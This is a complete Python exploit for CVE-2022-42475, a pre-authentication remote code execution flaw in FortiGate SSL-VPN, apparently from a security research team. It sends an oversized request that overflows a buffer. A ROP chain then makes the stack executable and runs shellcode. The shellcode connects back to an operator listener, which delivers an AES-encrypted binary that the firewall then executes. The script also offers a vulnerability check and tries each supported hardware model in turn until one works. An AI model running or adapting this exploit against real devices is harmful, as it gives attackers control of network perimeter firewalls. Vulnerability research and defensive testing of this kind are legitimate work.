#!/usr/bin/env python3

import sys
import os
import time
import socket
import struct
import ssl
import threading
import binascii
import argparse
from subprocess import run
import json
import atexit
import signal

from foxrop import ROP

# pip install PyCryto
# pip install pycryptodome
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad 

#
# Constants
#
PADDING                     = 0x4141414141414141
PADDING_LEN                 = 1024*12               
HEAD_PAD_LENGTH             = 154
CONTENT_LENGTH              = b"4294967297"
CHMOD_ATTR                  = 0x1ff                 # 0777
PROT_RWX                    = 7
MEM_LEN                     = 0x5000
SIGTRAP                     = 0xcccccccccccccccc    # INT 3
CONNECT_BACK_TIMEOUT        = 20                    # 
CONNECT_HELLO_TIMEOUT       = 10

# turns out i didn't plan well-enough ahead ;)
_global_exploit_was_triggered = False
_global_expected_hw_versions = []


#
# Does exploity things
#
class SSLVPNExploit:
    def __init__(self, host, port, sw_version, hw_version=None, connectBackHost="127.0.0.1", connectBackPort=443, debug=False):
        self.debug = debug
        self.host = host
        self.port = port
        self.connectBackHost = connectBackHost
        self.connectBackPort = connectBackPort
        self.AES_key = b""
        self.sw_version = sw_version
        self.hw_version = hw_version
        self.socket = None

        print("[+] Using cached shellcode. Edit %s (look for 'shellcode.s') to force refresh." % sys.argv[0])
        print("[+] Configured for connect-back to %s:%d" % (self.connectBackHost, self.connectBackPort))

    # connect to the remote SSLVPN webserver or die trying
    def connect(self):
        tries = 1
        useSSL = False
        while tries <= 6:
            try:
                #print("[+] Connecting to %s [ attempt %d of 6 ]                                \r" % (self.host, tries), end='')
                self.cleartext_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if useSSL == True:
                    ctx = ssl._create_unverified_context()
                    self.socket = ctx.wrap_socket(self.cleartext_socket)
                else:
                    self.socket = self.cleartext_socket
                self.socket.settimeout(2.0)
                self.socket.connect((self.host, self.port))

                return self.socket
            except socket.timeout as e:
                tries += 1
                continue
        
        return None

    # Used for patching a 4-byte IP address into the shellcode
    def ip_as_bytes(self, IP):
        octets = IP.split(".")
        for i in range(0,4):
            octets[i] = int(octets[i])
        return bytearray(octets)

    # used by the shellcode's payload decryption routine
    def set_AES_key(self, key):
        self.AES_key = key

    # we hard-code this into the shellcode. It's the non-padded length of the payload.
    def set_payload_length(self, length):
        self.payload_length = length

    # Test for vulnerability
    # This will return one of three states:
    #    False = Not vulnerable
    #    True  = Probably vulnerable
    #    None  = An unexpected result occurred
    def is_vulnerable(self):
        req = bytearray(b"")
        req += b"POST /remote/logincheck?KEEP=THIS HTTP/1.1\r\nHost: " + self.host.encode() + b": " + str(self.port).encode() + b"\r\nContent-Length: " + CONTENT_LENGTH + b"\r\nUser-Agent: AAAAAAAAAAAAAAAA\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\n\r\n"        
        req += b"AAAAAAAA"*(PADDING_LEN)

        print("[>] Testing to see if target is vulnerable (may take 10 seconds)")
        if self.connect() == None:
            print("[!] Error connecting to target")
            exit(1)

        try:
            # Send the payload. Vuln instances will crash, severing the connection and 
            # causing an exception to be thrown here.
            self.socket.sendall(req)
            
            # If this read succeeds then the target is probably not vulnerable.
            # If it times out, then it's also probably not vulnerable.
            self.socket.settimeout(10) 
            buf = self.socket.recv(1048576)
            
            # If the remote end disconnects without an HTTP response then it's vulnerable.
            if len(buf) == 0:
                return True

            # Check to see if it has the vendor patch applied 
            if buf.decode().__contains__("HTTP/1.1 413 Request Entity Too Large"):
                print("[>] Target is patched.")
                return False # 100% confidence that it's not vulnerable.

            # Ok, something weird and unexpected happened.
            print("[>] An unexpected response (%d bytes) was recieved:" % len(buf))
            print("----- BEGIN RESPONSE -----")
            print(buf.decode().replace("\\r\\n", "\n"))
            print("----- END RESPONSE -----")
            self.close()
            return None

        except socket.timeout as e:
            print("[>] Target waited for more data. Not vulnerable.")
            return False
        except Exception as e:
            print("[>] Target dropped the connection, which indicates a vulnerable device!")
            #print(e)
            return True

    # If successful, runs our connect-back shellcode on affected FortiGate firewall
    def do_exploit(self):     
        global _global_exploit_was_triggered
        global _global_expected_hw_versions

        # verify that the target is vulnerable
        result = self.is_vulnerable()
        if result is not True:
            exit(1)

        # Start an empty ROP chain
        rop = ROP("exploit_data.json", self.sw_version, self.hw_version, self.debug)

        # brute-force our way through the hardware (or just exploit the selected hardware, if specified)
        num_models = len(rop.hw_models())
        curr_model = 1
        anti_ban_counter = 0

        print("[+] Starting exploit")

        for hw_version in rop.hw_models().keys():

            rop.select_hw_version(hw_version)
            rop.clear_gadget_chain()

            # TODO: make this pretty
            req = bytearray(b"")
            #req += b"POST /remote/logincheck?KEEP=THIS HTTP/1.1\r\nHost: " + self.host.encode() + b": " + str(self.port).encode() + b"\r\nContent-Length: " + CONTENT_LENGTH + b"\r\nUser-Agent: AAAAAAAAAAAAAAAA\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\n\r\n"
            req  += b"POST /remote/logincheck?magic=aaa HTTP/1.1\r\nHost: " + self.host.encode() + b": " + str(self.port).encode() + b"\r\nContent-Length: " + CONTENT_LENGTH + b"\r\nUser-Agent: AAAAAAAAAAAAAAAA\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\n\r\n"

            # Just padding the start of the ROP buffer
            rop.add_padding(HEAD_PAD_LENGTH-2)    # this is of no consequense
            
            # Stage 2 - The stack pivot gadget dumps us here.
            # Stage 2.5 - "slide" down the stack by popping RETs
            # The hit a "add rsp, 0x18" to add 0x18 (24) bytes to $rsp.
            # We do this to "jump over" the stack pivot gadget and land in ~ 100kb of space that we control.
            # Not all platforms will give us a "add rsp, 0x18" gadget, but we might get "add rsp, xxx", so
            # we use RET to get us right up to the pivot and then jump over it using whatever gadget we can.
            # We land in another RET sled to account for not knowing the jump size in advance.
            rop.add_gadget("ret;", 23)
            rop.add_gadget("add rsp, 0x18; ret;")     
            
            # Stage 1 - Entry point of the ROP chain.
            # 
            # The exploit sets $rip to the address of STACK_PIVOT_GADGET then RETs to stage 2, above.
            # This part will be jumped over by stage 2.5, above.
            #rop.add_gadget("push rdx; adc byte [rbx + 0x41], bl; pop rsp; pop rbp; ret;") # Entry point: overwrite rip with the stack pivot gadget.
            rop.add_gadget("push rdx; adc [rbx+0x41], bl; pop rsp; pop rbp; ret;") # Entry point: overwrite rip with the stack pivot gadget.
            
            # Stage 3 - RET sled
            # 
            rop.add_gadget("ret;", 32)              # RET sled

            # Stage 4 - Calculate aligned memory page for stack address
            rop.add_gadget("pop rax; ret;")
            rop.add_immediate(0xfffffffffffff000)
            
            rop.add_gadget("and rax, rdi; ret;")
            rop.add_gadget("pop rbx; ret;")
            rop.add_gadget("add rsp, 0x18; ret;")
            
            rop.add_gadget("mov rdi, rax; call rbx;")
            rop.add_gadget("ret;", 32)
            
            rop.add_gadget("pop rsi; ret;")
            rop.add_immediate(MEM_LEN)

            rop.add_gadget("pop rdx; ret;")
            rop.add_immediate(PROT_RWX)

            rop.add_gadget("pop rax; ret;")
            rop.add_gadget("mprotect")
        
            rop.add_gadget("jmp rax;")

            # Stage 7 - NOP/RET sled, then JMP to stack address.
            # At this point our ROP payload/stack is executable. Shellcode follows.
            rop.add_gadget("ret;", 8)
            rop.add_gadget("jmp rsp;") 
            rop.add_immediate(0x9090909090909090, 8)

            # build and convert the shellcode
            #run( [ 'as', '-o', 'shellcode.o', 'shellcode.s' ], check=True )
            result = run("objdump -d -M intel shellcode.o |egrep '^...[a-z0-9]:' |cut -c 7-28|tr -d '\\n'|tr -d ' '|tr -d '\\t'|xxd -r -p", shell=True, capture_output=True)
            shellcode = result.stdout

            # patch in the relevant AES key for payload decryption
            shellcode = shellcode.replace(b"00000000", self.AES_key[0:8])
            shellcode = shellcode.replace(b"11111111", self.AES_key[8:17])

            # we need to know the real length of the payload file before padding
            shellcode = shellcode.replace(b"22222222", struct.pack("<Q", self.payload_length))
            
            # fix up GOT function addresses in the shellcode
            shellcode = shellcode.replace(b"33333333", struct.pack("<Q", rop.get_address("AES_set_decrypt_key")))
            shellcode = shellcode.replace(b"44444444", struct.pack("<Q", rop.get_address("AES_cbc_encrypt")))
            shellcode = shellcode.replace(b"55555555", struct.pack("<Q", rop.get_address("calloc")))

            # patch in the model # of the device we're brute-forcing so that the ping-back tells us 
            # which payload worked
            null_len = 8 - len(hw_version) # assumption breaks if strlen(hw_version) > 7
            patch = hw_version + "\x00"*null_len
            shellcode = shellcode.replace(b"88888888", patch.encode())
            
            # patch in the operator's IP
            print("[+] Patching in host/port of %s:%s" % (self.connectBackHost, self.connectBackPort))
            shellcode = shellcode.replace(b"XXXXXX", struct.pack(">H", self.connectBackPort ) + self.ip_as_bytes(self.connectBackHost))
            
            # shellcode gets tacked onto the end of the 8-byte NOP sled
            rop.add_bytes(shellcode)        

            # sprinkle liberally with 4MB of padding
            rop.add_padding(PADDING_LEN)
            req += rop.bytes()

            if _global_exploit_was_triggered == True:
                print("[+] Listener reported a connect-back!                  ")
                return

            _global_expected_hw_versions.append(hw_version)

            # send it!
            print("[+] Sending exploit [%d of %d] for model %s on v%s...             \r" % (curr_model, num_models, hw_version, self.sw_version), end='')
            if self.connect() == None:
                print("[!] Error connecting to target. Sleeping for 61 seconds.             ")
                time.sleep(61)

            self.send_data(req)
            time.sleep(.25)
            curr_model += 1
            self.close()
        

    def send_data(self, req, block_size=1048576):
        # skootch data down the socket nice n quick
        try:
            data_len = len(req)
            bytes_sent = 0
            while bytes_sent < data_len:
                num_bytes_to_send = data_len - bytes_sent
                
                if num_bytes_to_send < block_size:
                    end = bytes_sent + num_bytes_to_send
                else:
                    end = bytes_sent + block_size

                send_buf = req[bytes_sent:end]
                bytes_sent += self.socket.send(send_buf)
        except Exception as e:
            #print(e)
            pass                # this fixes a weird bug in the underlying SSL stuff that only pops up on recent Python builds. I don't know the full root cause, but I know this fixes it.
        finally:
            pass

    def close(self):
        if self.socket is not None:
            self.socket.close()
        self.socket = None


#
# Sets up a listener and sends encrypted payloads back to waiting shellcode
#
class EncryptedPayloadStager:
    def __init__(self, payload, port, is_validate_only = True):
        self.payload = payload
        self.encrypted_payload = b""
        self.port = port
        self.generate_key()
        self.encrypt_payload()
        self.is_validate_only = is_validate_only

    def generate_key(self):
        self.AES_iv = b"\x00"*16
        
        with open("/dev/urandom", "rb") as f:
            print("[+] Generating random 128-bit AES key to encrypt payload")
            self.AES_key = f.read(16)

    def get_AES_key(self):
        return self.AES_key

    def encrypt_payload(self):
        print("[+] Encrypting payload...")
        
        # pad it to AES block size
        delta = 16 - (len(self.payload) % 16)
        padded_payload = self.payload + b"\x00"*delta
        
        # encrypt it with 128-bit AES in CBC mode
        cipher = AES.new(self.AES_key, AES.MODE_CBC, self.AES_iv)
        self.encrypted_payload = cipher.encrypt(padded_payload)
        tmp_payload = struct.pack("<I", len(self.encrypted_payload))
        tmp_payload += self.encrypted_payload
        self.encrypted_payload = tmp_payload

    # Socket setup, everything except the listen/accept
    def init_server(self):
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
        except Exception as e:
            print(e);
            exit(1)

    def shutdown_server(self):
        self.server_sock.close()

    # Listener for the connect-back from the shellcode.
    def stand_and_deliver(self):
        global _global_exploit_was_triggered
        global _global_expected_hw_versions

        self.init_server()
        print("[<] Listener bound to port %s, waiting for connect-back..." % self.port)
        try:
            self.server_sock.listen()

            conn, addr = self.server_sock.accept()
            host, port = addr
            with conn:
                print("[<] Incoming request from %s:%d                             " % (host, port))
            
                #try:
                bytes_received = 0
                response = b""
                while bytes_received < 8:
                    response += conn.recv(8)
                    bytes_received += len(response)

                print("[<] Received hello packet from target!! Model #: %s" % response.decode())
                
                data_len = len(self.encrypted_payload)
                print("[<] Sending encrypted payload of %d bytes" % data_len)

                bytes_sent = 0
                block_size = 4096

                while bytes_sent < data_len:
                    num_bytes_to_send = data_len - bytes_sent
                    
                    if num_bytes_to_send < block_size:
                        end = bytes_sent + num_bytes_to_send
                    else:
                        end = bytes_sent + block_size

                    send_buf = self.encrypted_payload[bytes_sent:end]
                    bytes_sent += conn.send(send_buf)
                
                print("[<] Finished sending payload (%d bytes), waiting for response..." % bytes_sent)

                conn.settimeout(CONNECT_HELLO_TIMEOUT)
                try:
                    bytes_received = 0
                    response = b""
                    while bytes_received < 8:
                        response += conn.recv(1)
                        bytes_received += len(response)

                    hw_version_from_shellcode_ping_back = response.decode()
                    if hw_version_from_shellcode_ping_back in _global_expected_hw_versions:
                        print("[<] Received the expected response ('%s') from %s" % (hw_version_from_shellcode_ping_back, host))
                        print("[<] Target is VULNERABLE with 100% confidence.")
                        # let the brute-forcer know that we ran shellcode on the target
                        _global_exploit_was_triggered = True
                    else:
                        print("[<] Invalid response from target! Try again.")
                except socket.timeout as e:
                    print("[<] No response recieved from target within %d seconds" % CONNECT_HELLO_TIMEOUT)
                except Exception as e:
                    print("[<] Exception")
                    print(e)

        except Exception as e:
            print("[<]  exception...")
            print(e)
            
##
## Off we go!
##
if __name__ == '__main__':

    ##
    ## Handle command-line arguments
    ##
    parser = argparse.ArgumentParser(description="FortiGate SSLVPN Exploit | CVE-2022-42475 | Bishop Fox Cosmos | Feb 2022")
    if not "-l" in sys.argv:
        parser.add_argument("-t", dest="targetHost", help="Hostname or IPv4 address of the FortiGate device", type=str, required=True)
        parser.add_argument("-p", dest="targetPort", help="TCP port (default: 8443)", type=int, default=8443)
        parser.add_argument("-d", dest="debugMode", help="enable debugging", action="store_true", default=False)
    if not "-e" in sys.argv and not "-l" in sys.argv:
        parser.add_argument("-v", dest="modeVulnCheck", help="Determine if target is vulnerable or not", action="store_true")
    if not "-v" in sys.argv and not "-l" in sys.argv:
        sploit = parser.add_argument_group("Exploitation options")
        sploit.add_argument("-e", dest="modeExploit", help="Exploit the target: upload and execute a binary.", action="store_true", default=False)
        sploit.add_argument("-c", dest="connectOnly", help="Exploit the target: connect-back only, no exec.", action="store_true", default=False)
        sploit.add_argument("-f", dest="filename", help="File to upload and execute on the target", type=str)
        sploit.add_argument("-P", dest="connectBackPort", help="Connect back to TCP <port>. Default: 443", type=int, default=443)
        sploit.add_argument("-H", dest="connectBackHost", help="Connect back to <host>.", type=str, required=True)
    if (not "-e" in sys.argv and not "-v" in sys.argv):
        parser.add_argument("-l", dest="modeListTargets", help="List available targets (with -s and -m filters).", action="store_true", default=False)   
    if (not "-e" in sys.argv and not "-v" in sys.argv and "-l" in sys.argv) or ("-e" in sys.argv and not "-v" in sys.argv):
        parser.add_argument("-s", dest="sw_version", help="Software version (e.g. 6.4.10, 7.0.4, etc)", type=str, required=True if not "-l" in sys.argv else False)
        parser.add_argument("-m", dest="hw_version", help="Model (e.g. 100D, 600F, etc)", type=str)
    args = parser.parse_args()
    
    if (("-v" in sys.argv) and ("-e" in sys.argv)) or (not ("-v" in sys.argv) and (not "-e" in sys.argv) and (not "-l" in sys.argv)):
        parser.error("Select either '-v' (vuln check) or '-e' (exploit) or '-l' (list).")
        exit(1)

    if ("-e" in sys.argv) and (("-c" in sys.argv and "-f" in sys.argv) or (not "-c" in sys.argv and not "-f" in sys.argv)):
        parser.error("Select either '-c' (connect-back) or '-f filename' (download/exec filename)")
        exit(1)

    if "-e" in sys.argv:
        if not "-H" in sys.argv:
            parser.error("A connect-back host:port is required")
            exit(1)
        try:
            resolvedHost = socket.gethostbyname(args.connectBackHost)
            args.connectBackHost = resolvedHost
        except Exception as e:
            print("[!] Error resolving %s" % args.connectBackHost)
            print(e)
            exit(1)


    print("""
    --[ CVE-2022-42475: FortiGate Remote Pre-auth RCE ]--
    --[ Bishop Fox Cosmos Team X                      ]--
    """)

    payload_data = b"Bishop Fox Cosmos Team X"

    if "modeListTargets" in args:
        sw_version = args.sw_version if "-s" in sys.argv else None
        hw_version = args.hw_version if "-m" in sys.argv else None
        rop = ROP("exploit_data.json", sw_version, hw_version, debug=False, show_summary=False)

        if sw_version is None:
            gadgets = rop.get_all_gadgets()
            for s in gadgets:
                print("%s:" % s)
                for h in gadgets[s]:
                    print("    %s" % h)
        elif sw_version is not None and hw_version is None:
            gadgets = rop.get_gadgets_for_sw(sw_version)
            print("%s:" % sw_version)
            for h in gadgets:
                print("    %s" % h)
        elif sw_version is not None and hw_version is not None:
            gadgets = rop.get_gadgets_for_sw_and_hw(sw_version, hw_version)
            if "mprotect" in gadgets:
                print("[+] Model %s on software v%s is supported!" % (hw_version, sw_version))
            else:
                print("[!] Sorry, model %s on software v%s is NOT currently supported." % (hw_version, sw_version))
                exit(1)

        exit(0)


    if "modeVulnCheck" in args:
        args.modeExploit = False
        print("[+] Running in validate-only mode. No RCE.")
        exploit = SSLVPNExploit(args.targetHost, args.targetPort, None, None)
        result = exploit.is_vulnerable()
        if result == None:
            print("[!] An error occurred testing '%s:%d' for the vulnerability.\n[!] Is this even a FortiGate?" % (args.targetHost, args.targetPort))
            exit(2)
        if result == True:
            print("[+] Target '%s:%d' appears to be VULNERABLE" % (args.targetHost, args.targetPort))
            exit(0)
        else:
            print("[+] Target '%s:%d' is NOT vulnerable" % (args.targetHost, args.targetPort))
            exit(1)
    else:
        # We're in one of two possible exploit modes:
        # Connect-back only
        # Connect-back, download binary, execve(binary)
        args.modeVulnCheck = False
        
        if not args.connectOnly:
            try:
                with open(args.filename, "rb") as f:
                    payload_data = f.read()
                    print("[+] Exploit will attempt to execve(\"%s\") on the target            " % args.filename)
            except Exception as e:
                print("[!] Error opening file '%s'" % args.filename)
                exit(1)

    # If -c was passed on the command-line then we're in test mode.
    # Test mode means: connect-back for proof of code execution.
    #   Non-test mode: connect-back, retrieve binary, execute binary on target.
    payload = EncryptedPayloadStager(payload_data, args.connectBackPort, args.connectOnly)
    exploit = SSLVPNExploit(args.targetHost, args.targetPort, args.sw_version, args.hw_version, args.connectBackHost, args.connectBackPort, args.debugMode)
    exploit.set_AES_key(payload.get_AES_key())
    exploit.set_payload_length(len(payload_data))

    print("[+] Starting encrypted payload listener...")
    # Start a background listener
    listener_thread = threading.Thread(target=payload.stand_and_deliver)
    listener_thread.daemon = True
    listener_thread.start()

    # showtime!
    print("[+] Preparing for %s..." % ("exploit" if args.modeExploit==True else "vuln check"))
    print("[+] Sending request!")
    exploit.do_exploit()

    # wait for the payload stager to finish
    if _global_exploit_was_triggered == False:
        print("[+] Waiting 100000 seconds for connect-back from target...                ")
        time.sleep(100000)

    if _global_exploit_was_triggered == False:
        print("[!] Exploit failed.")
        exit(1)

    print("[+] All done!")
    exit(0)
